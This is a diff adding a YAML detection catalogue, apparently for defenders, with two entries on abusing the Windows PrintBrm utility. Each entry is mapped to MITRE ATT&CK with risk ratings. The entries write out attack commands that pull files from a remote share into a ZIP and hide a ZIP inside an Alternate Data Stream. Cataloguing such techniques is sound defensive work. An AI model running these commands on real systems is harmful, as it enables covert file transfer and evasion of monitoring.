@@ -1,0 +1,44 @@
+- command: PrintBrm -b -d \\1.2.3.4\share\example_folder -f C:\Users\user\Desktop\new.zip
+  description: Abuse of PrintBrm to create a local ZIP file from a remotely-hosted directory.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+    Collection:
+      - T1560.001
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/
+  risk: High
+  risk_reason: Use of printbrm in this manner is highly suspicious.
+  fidelity: High
+  fidelity_reason: This type of behavior is typically rare in most organizations.
+  tool: printbrm
+  threatactors:
+    N/A:
+      - N/A
+- command: PrintBrm -r -f C:\Users\user\Desktop\data.txt:hidden.zip -d C:\Users\user\Desktop\new_folder
+  description: Abuse of PrintBrm to create a local ZIP embedded within an Alternate Data Stream (ADS) of data.txt from a remotely-hosted directory.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+    Collection:
+      - T1560.001
+    Defense Evasion:
+      - T1564.004
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/PrintBrm/
+  risk: High
+  risk_reason: Use of printbrm in this manner is highly suspicious, especially involving an ADS.
+  fidelity: High
+  fidelity_reason: This type of behavior is typically rare in most organizations.
+  tool: printbrm
+  threatactors:
+    N/A:
+      - N/A
